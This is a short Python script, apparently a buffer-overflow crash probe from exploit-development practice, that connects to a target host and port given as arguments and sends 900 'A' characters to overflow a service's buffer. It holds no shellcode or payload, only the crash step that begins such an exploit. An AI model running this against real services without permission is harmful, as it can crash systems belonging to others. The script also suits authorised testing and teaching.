import socket, sys

def main(target, port):

	buffer = "A" * 900

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((target, int(port)))

	s.send(buffer)

	s.close()

if __name__ == "__main__":

	main(sys.argv[1], sys.argv[2])